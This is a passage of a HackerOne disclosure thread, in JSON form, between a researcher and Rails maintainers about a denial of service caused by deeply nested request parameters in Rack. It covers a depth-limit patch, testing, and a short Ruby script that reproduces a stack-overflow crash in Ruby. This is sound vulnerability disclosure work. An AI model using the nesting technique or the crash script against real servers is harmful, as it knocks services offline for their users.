                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Hey Aaron, sorry was on vacation over the weekend. \n\n> Also I couldn't repro with a GET against thin because it yelled about URL length,\n> but I was still able to get the error via POST.\n\nYea, I tend to either switch the method to POST, or in the case of attacking the root of the application via GET, you can specify a content-type and length and the body parameters will be parsed regardless of HTTP method.\n\n> It seems to fix the stack error. I set the max depth to 25, but we could set it to whatever. I think this\n> means we won't have to modify Rails to fix this. Any comments on this patch? If it looks good, I can\n> package a prerelease of Rack so we can test Sinatra and Rails against the fix.\n\nThis fix looks good to me. I can help test out the packaged prerelease. A depth of 25 seems sane to me and I don't think I've ever tested a Rails app that had anything close to that level of nesting.", 
            "markdown_message": "<p>Hey Aaron, sorry was on vacation over the weekend. </p>\n\n<blockquote>\n<p>Also I couldn&#39;t repro with a GET against thin because it yelled about URL length,<br>\nbut I was still able to get the error via POST.</p>\n</blockquote>\n\n<p>Yea, I tend to either switch the method to POST, or in the case of attacking the root of the application via GET, you can specify a content-type and length and the body parameters will be parsed regardless of HTTP method.</p>\n\n<blockquote>\n<p>It seems to fix the stack error. I set the max depth to 25, but we could set it to whatever. I think this<br>\nmeans we won&#39;t have to modify Rails to fix this. Any comments on this patch? If it looks good, I can<br>\npackage a prerelease of Rack so we can test Sinatra and Rails against the fix.</p>\n</blockquote>\n\n<p>This fix looks good to me. I can help test out the packaged prerelease. A depth of 25 seems sane to me and I don&#39;t think I&#39;ve ever tested a Rails app that had anything close to that level of nesting.</p>\n", 
            "type": "Activities::Comment", 
            "id": 314365, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/027/438/74d2b76e9f45ea50579161043e91b1285bb879ef/rack-1.6.1.gem?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222718Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2f4b2179eb9010dcd7bfd01e979fb0926f04fccf9afe8ee5a46fa1fbe0179928", 
                    "type": "application/x-tar", 
                    "id": 27438, 
                    "filename": "rack-1.6.1.gem"
                }
            ], 
            "automated_response": false, 
            "created_at": "2015-01-20T22:33:49.335Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-20T22:33:49.335Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "@ff7f00 no problem!\n\nI've uploaded Rack 1.6.1.  I haven't tried your tests with this fix against Rails yet.  I'll try to do that after work.", 
            "markdown_message": "<p><a href=\"/ff7f00\">@ff7f00</a> no problem!</p>\n\n<p>I&#39;ve uploaded Rack 1.6.1.  I haven&#39;t tried your tests with this fix against Rails yet.  I&#39;ll try to do that after work.</p>\n", 
            "type": "Activities::Comment", 
            "id": 314393, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-21T04:01:01.436Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-21T04:01:01.436Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Thanks @tenderlove. What's the most efficient way to get Rails to use this version of rack? I attempted to replace it in the gemspec for actionpack but it looks like resque requires 1.6.0. Should I pull in resque, modify the rack requirement, and rebuild from there?", 
            "markdown_message": "<p>Thanks <a href=\"/tenderlove\">@tenderlove</a>. What&#39;s the most efficient way to get Rails to use this version of rack? I attempted to replace it in the gemspec for actionpack but it looks like resque requires 1.6.0. Should I pull in resque, modify the rack requirement, and rebuild from there?</p>\n", 
            "type": "Activities::Comment", 
            "id": 314625, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-01-21T21:50:30.199Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-01-21T21:50:30.199Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "@ff7f00 you should be able to just install the Rails gems as usual, then install this rack preview gem.  It should use the latest version of Rack that you have on your system when you rebundle.\n\nIOW: Install Rails per usual, install the preview release of Rack, then try `rails new`, etc.\n\nI couldn't get to this last night, so I'll try again tonight.", 
            "markdown_message": "<p><a href=\"/ff7f00\">@ff7f00</a> you should be able to just install the Rails gems as usual, then install this rack preview gem.  It should use the latest version of Rack that you have on your system when you rebundle.</p>\n\n<p>IOW: Install Rails per usual, install the preview release of Rack, then try <code>rails new</code>, etc.</p>\n\n<p>I couldn&#39;t get to this last night, so I&#39;ll try again tonight.</p>\n", 
            "type": "Activities::Comment", 
            "id": 315319, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-13T03:08:17.003Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-13T03:08:17.003Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Wow, I can't believe it's been a month already since I submitted this. Time is flying...\n\nAlright, so I was able to follow your instructions and get Rails to use the preview release of Rack. At 25 levels of nesting, Rack started throwing a RangeError (which is inline with the param_depth_limit set in the Utils class).\n\nHowever, it appears that there is a memory leak somewhere. If I let the attack run with an added layer of nesting on each request while analyzing the memory, it just keeps going up and never gets freed. This will continue until the server runs out of memory and hangs the process. This is running with ruby 2.2.0p0 which should be fixing any potential symbol being created and not freed via the new GC. Pausing the attack doesn't result in any memory being freed. After pausing, I replayed a single attack multiple times (with a constant nesting level) and the memory continued to be eaten up without being freed.\n\nI've got to get going at the moment but I'll try some different parameters to try and narrow down what might be causing this.", 
            "markdown_message": "<p>Wow, I can&#39;t believe it&#39;s been a month already since I submitted this. Time is flying...</p>\n\n<p>Alright, so I was able to follow your instructions and get Rails to use the preview release of Rack. At 25 levels of nesting, Rack started throwing a RangeError (which is inline with the param_depth_limit set in the Utils class).</p>\n\n<p>However, it appears that there is a memory leak somewhere. If I let the attack run with an added layer of nesting on each request while analyzing the memory, it just keeps going up and never gets freed. This will continue until the server runs out of memory and hangs the process. This is running with ruby 2.2.0p0 which should be fixing any potential symbol being created and not freed via the new GC. Pausing the attack doesn&#39;t result in any memory being freed. After pausing, I replayed a single attack multiple times (with a constant nesting level) and the memory continued to be eaten up without being freed.</p>\n\n<p>I&#39;ve got to get going at the moment but I&#39;ll try some different parameters to try and narrow down what might be causing this.</p>\n", 
            "type": "Activities::Comment", 
            "id": 331377, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-13T03:10:03.185Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-13T03:10:03.185Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Blech.  I'll try against a real app.  Sounds like we aren't freeing up some resources after the exception happens.  Are you running in production, or development mode?", 
            "markdown_message": "<p>Blech.  I&#39;ll try against a real app.  Sounds like we aren&#39;t freeing up some resources after the exception happens.  Are you running in production, or development mode?</p>\n", 
            "type": "Activities::Comment", 
            "id": 331378, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-13T18:37:53.757Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-13T18:37:53.757Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Ah good call, it looks like this happens only in development. With the production flag, the memory is stable and I let the attack run to 10,000 levels and the app didn't even flinch. JSON performed similarly with stable memory usage, the only difference was that it imposes it's own depth limit of 100 and will print the entire hash into the production log. \n\nMy attack script actually crashed with a SystemStackError at a depth of 8731 8)", 
            "markdown_message": "<p>Ah good call, it looks like this happens only in development. With the production flag, the memory is stable and I let the attack run to 10,000 levels and the app didn&#39;t even flinch. JSON performed similarly with stable memory usage, the only difference was that it imposes it&#39;s own depth limit of 100 and will print the entire hash into the production log. </p>\n\n<p>My attack script actually crashed with a SystemStackError at a depth of 8731 8)</p>\n", 
            "type": "Activities::Comment", 
            "id": 331708, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-18T21:52:01.224Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-18T21:52:01.224Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "If there is anything else you guys need from me to close this out let me know.", 
            "markdown_message": "<p>If there is anything else you guys need from me to close this out let me know.</p>\n", 
            "type": "Activities::Comment", 
            "id": 334346, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-19T17:10:49.382Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-19T17:10:49.382Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Not right now.  I'm testing against older versions of Rails too.  I want to make sure that this issue doesn't exist in Rails as well but in older versions.  I'll update this ticket again today with my findings, then we can get the CVE rolling.\n\nThanks so much for helping out with this!", 
            "markdown_message": "<p>Not right now.  I&#39;m testing against older versions of Rails too.  I want to make sure that this issue doesn&#39;t exist in Rails as well but in older versions.  I&#39;ll update this ticket again today with my findings, then we can get the CVE rolling.</p>\n\n<p>Thanks so much for helping out with this!</p>\n", 
            "type": "Activities::Comment", 
            "id": 335068, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-20T18:57:09.908Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-20T18:57:09.908Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Hi,\n\nI just wanted to update.  I was looking in to this more, and the patch that I proposed is not the correct fix.  People would still be vulnerable to DoS attacks.  This is actually a bug in Ruby.  Here is a script to demo the issue:\n\n```ruby\ndef normalize_encode_params(d)\n  if d == 0\n    'bar'\n  else\n    ['a'].each_with_object({}) do |key, new_hash|\n      new_hash[key] = normalize_encode_params(d - 1)\n    end\n  end\nend\n\nThread.new {\n  begin\n    begin\n      normalize_encode_params 1846\n    rescue Exception\n      normalize_encode_params 1846\n    end\n  rescue Exception\n  end\n  puts 'in thread' # never reached\n}.join\n\nputs 'after' # never reached\n```\n\nI'll coordinate with the Ruby sec team and post here when I get more information.", 
            "markdown_message": "<p>Hi,</p>\n\n<p>I just wanted to update.  I was looking in to this more, and the patch that I proposed is not the correct fix.  People would still be vulnerable to DoS attacks.  This is actually a bug in Ruby.  Here is a script to demo the issue:</p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">def</span> <span class=\"nf\">normalize_encode_params</span><span class=\"p\">(</span><span class=\"n\">d</span><span class=\"p\">)</span>\n  <span class=\"k\">if</span> <span class=\"n\">d</span> <span class=\"o\">==</span> <span class=\"mi\">0</span>\n    <span class=\"s1\">&#39;bar&#39;</span>\n  <span class=\"k\">else</span>\n    <span class=\"p\">[</span><span class=\"s1\">&#39;a&#39;</span><span class=\"p\">].</span><span class=\"nf\">each_with_object</span><span class=\"p\">({})</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"n\">new_hash</span><span class=\"o\">|</span>\n      <span class=\"n\">new_hash</span><span class=\"p\">[</span><span class=\"n\">key</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">normalize_encode_params</span><span class=\"p\">(</span><span class=\"n\">d</span> <span class=\"o\">-</span> <span class=\"mi\">1</span><span class=\"p\">)</span>\n    <span class=\"k\">end</span>\n  <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n\n<span class=\"no\">Thread</span><span class=\"p\">.</span><span class=\"nf\">new</span> <span class=\"p\">{</span>\n  <span class=\"k\">begin</span>\n    <span class=\"k\">begin</span>\n      <span class=\"n\">normalize_encode_params</span> <span class=\"mi\">1846</span>\n    <span class=\"k\">rescue</span> <span class=\"no\">Exception</span>\n      <span class=\"n\">normalize_encode_params</span> <span class=\"mi\">1846</span>\n    <span class=\"k\">end</span>\n  <span class=\"k\">rescue</span> <span class=\"no\">Exception</span>\n  <span class=\"k\">end</span>\n  <span class=\"nb\">puts</span> <span class=\"s1\">&#39;in thread&#39;</span> <span class=\"c1\"># never reached</span>\n<span class=\"p\">}.</span><span class=\"nf\">join</span>\n\n<span class=\"nb\">puts</span> <span class=\"s1\">&#39;after&#39;</span> <span class=\"c1\"># never reached</span>\n</code></pre>\n<p>I&#39;ll coordinate with the Ruby sec team and post here when I get more information.</p>\n", 
            "type": "Activities::Comment", 
            "id": 336174, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-20T22:46:41.987Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-20T22:46:41.987Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Huh, interesting. So this is something tied specifically to threads as I can't reproduce this in proc/lambdas or fibers.", 
            "markdown_message": "<p>Huh, interesting. So this is something tied specifically to threads as I can&#39;t reproduce this in proc/lambdas or fibers.</p>\n", 
            "type": "Activities::Comment", 
            "id": 336377, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-20T23:53:00.122Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-20T23:53:00.122Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Not specifically to threads.  In this case, it's supposed to be a segv.  If you attach with a debugger, the backtrace looks like this:\n\n```\n(lldb) bt\n* thread #4: tid = 0x1c6d1, 0x00000001030f6edc ruby`vm_call0_body + 2108, stop reason = EXC_BAD_ACCESS (code=2, address=0x10440fff8)\n  * frame #0: 0x00000001030f6edc ruby`vm_call0_body + 2108\n    frame #1: 0x00000001030f88ac ruby`check_match + 268\n    frame #2: 0x00000001030df55f ruby`vm_exec_core + 6735\n    frame #3: 0x00000001030ef3a1 ruby`vm_exec + 129\n    frame #4: 0x00000001030f3fd5 ruby`invoke_block_from_c + 2213\n    frame #5: 0x00000001030ebd78 ruby`rb_yield_values + 408\n    frame #6: 0x00000001030f398a ruby`invoke_block_from_c + 602\n    frame #7: 0x00000001030ebbb8 ruby`rb_yield + 184\n    frame #8: 0x0000000102fdced1 ruby`each_pair_i + 17\n    frame #9: 0x0000000102fdd6d5 ruby`hash_foreach_iter + 37\n    frame #10: 0x0000000103087111 ruby`st_foreach_check + 113\n    frame #11: 0x0000000102fd7062 ruby`hash_foreach_call + 34\n```\n\n`EXC_BAD_ACCESS` is basically a memory error and usually delivered with a SEGV.  Apparently it is possible to cause a SEGV with a SystemStackError.  I'm trying to see if there's anything that can be done on the Ruby core side.  If not, we'll have to go with my patch and warn people not to do recursive functions with user input (which is not ideal).", 
            "markdown_message": "<p>Not specifically to threads.  In this case, it&#39;s supposed to be a segv.  If you attach with a debugger, the backtrace looks like this:</p>\n<pre class=\"highlight plaintext\"><code>(lldb) bt\n* thread #4: tid = 0x1c6d1, 0x00000001030f6edc ruby`vm_call0_body + 2108, stop reason = EXC_BAD_ACCESS (code=2, address=0x10440fff8)\n  * frame #0: 0x00000001030f6edc ruby`vm_call0_body + 2108\n    frame #1: 0x00000001030f88ac ruby`check_match + 268\n    frame #2: 0x00000001030df55f ruby`vm_exec_core + 6735\n    frame #3: 0x00000001030ef3a1 ruby`vm_exec + 129\n    frame #4: 0x00000001030f3fd5 ruby`invoke_block_from_c + 2213\n    frame #5: 0x00000001030ebd78 ruby`rb_yield_values + 408\n    frame #6: 0x00000001030f398a ruby`invoke_block_from_c + 602\n    frame #7: 0x00000001030ebbb8 ruby`rb_yield + 184\n    frame #8: 0x0000000102fdced1 ruby`each_pair_i + 17\n    frame #9: 0x0000000102fdd6d5 ruby`hash_foreach_iter + 37\n    frame #10: 0x0000000103087111 ruby`st_foreach_check + 113\n    frame #11: 0x0000000102fd7062 ruby`hash_foreach_call + 34\n</code></pre>\n<p><code>EXC_BAD_ACCESS</code> is basically a memory error and usually delivered with a SEGV.  Apparently it is possible to cause a SEGV with a SystemStackError.  I&#39;m trying to see if there&#39;s anything that can be done on the Ruby core side.  If not, we&#39;ll have to go with my patch and warn people not to do recursive functions with user input (which is not ideal).</p>\n", 
            "type": "Activities::Comment", 
            "id": 336419, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-23T18:55:48.824Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-23T18:55:48.824Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Well, this got a bit more interesting.", 
            "markdown_message": "<p>Well, this got a bit more interesting.</p>\n", 
            "type": "Activities::Comment", 
            "id": 338475, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-02-23T18:56:05.170Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-02-23T18:56:05.170Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Well, this got a bit more interesting.", 
            "markdown_message": "<p>Well, this got a bit more interesting.</p>\n", 
            "type": "Activities::Comment", 
            "id": 338476, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-04-28T01:15:39.518Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-28T01:15:39.518Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Hey @tenderlove, was wondering if this bug ended up getting some attention on the Ruby core side?", 
            "markdown_message": "<p>Hey <a href=\"/tenderlove\">@tenderlove</a>, was wondering if this bug ended up getting some attention on the Ruby core side?</p>\n", 
            "type": "Activities::Comment", 
            "id": 392097, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-03T06:55:55.148Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-03T06:55:55.148Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "@ff7f00 hey, sorry for the slow response.  I've gone back and forth with the rest of the core team, and it sounds like they just aren't going to fix it.  We're going to go forward with the rack changes to work around this.  Unfortunately this will only address this one particular place where a stack overflow can occur.", 
            "markdown_message": "<p><a href=\"/ff7f00\">@ff7f00</a> hey, sorry for the slow response.  I&#39;ve gone back and forth with the rest of the core team, and it sounds like they just aren&#39;t going to fix it.  We&#39;re going to go forward with the rack changes to work around this.  Unfortunately this will only address this one particular place where a stack overflow can occur.</p>\n", 
            "type": "Activities::Comment", 
            "id": 438442, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-03T21:30:01.710Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-03T21:30:01.710Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "@tenderlove Sounds good, thanks for the update.", 
            "markdown_message": "<p><a href=\"/tenderlove\">@tenderlove</a> Sounds good, thanks for the update.</p>\n", 
            "type": "Activities::Comment", 
            "id": 439998, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-08T18:48:35.766Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-08T18:48:35.766Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "@ff7f00 how would you like to be credited in the advisory?", 
            "markdown_message": "<p><a href=\"/ff7f00\">@ff7f00</a> how would you like to be credited in the advisory?</p>\n", 
            "type": "Activities::Comment", 
            "id": 444899, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-08T19:01:50.361Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-08T19:01:50.361Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Tomek Rabczak from NCC Group should work.\n\nThanks,\nTomek", 
            "markdown_message": "<p>Tomek Rabczak from NCC Group should work.</p>\n\n<p>Thanks,<br>\nTomek</p>\n", 
            "type": "Activities::Comment", 
            "id": 444914, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-16T18:59:03.615Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-16T18:59:03.615Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "We shipped the fix for this here:\n\nhttps://groups.google.com/forum/#!topic/ruby-security-ann/gcUbICUmKMc\n\nSo I think we can close this now.", 
            "markdown_message": "<p>We shipped the fix for this here:</p>\n\n<p><a title=\"https://groups.google.com/forum/#!topic/ruby-security-ann/gcUbICUmKMc\" href=\"/redirect?signature=e765bdcac072b5e138233520e4d43c3a7ea75387&amp;url=https%3A%2F%2Fgroups.google.com%2Fforum%2F%23%21topic%2Fruby-security-ann%2FgcUbICUmKMc\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://groups.google.com/forum/#!topic/ruby-security-ann/gcUbICUmKMc</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>So I think we can close this now.</p>\n", 
            "type": "Activities::Comment", 
            "id": 474467, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "ff7f00", 
                "url": "/ff7f00"
            }, 
            "created_at": "2015-06-16T19:02:04.072Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-16T19:02:04.072Z", 
            "actor": {
                "username": "rafaelfranca", 
                "url": "/rafaelfranca", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/981/281bfa78e7ec84f83ee4efe2cf53f744cf07b8c0_medium.jpg?1397516124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 474471, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-16T19:02:29.131Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-16T19:02:29.131Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "Sounds good, thanks a lot for all your help on this one @tenderlove and @nzkoz!", 
            "markdown_message": "<p>Sounds good, thanks a lot for all your help on this one <a href=\"/tenderlove\">@tenderlove</a> and <a href=\"/nzkoz\">@nzkoz</a>!</p>\n", 
            "type": "Activities::Comment", 
            "id": 474472, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-16T19:06:05.179Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-16T19:06:05.179Z", 
            "actor": {
                "username": "rafaelfranca", 
                "url": "/rafaelfranca", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/981/281bfa78e7ec84f83ee4efe2cf53f744cf07b8c0_medium.jpg?1397516124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "first_to_agree": true, 
            "message": " ", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 474481, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-16T21:56:07.860Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-16T21:56:07.860Z", 
            "actor": {
                "username": "ff7f00", 
                "url": "/ff7f00", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/056/ea01634831611652cf7c1208dac5fbf3a2389382_medium.png?1420580655"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "rails", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 474657, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-16T21:56:27.841Z", 
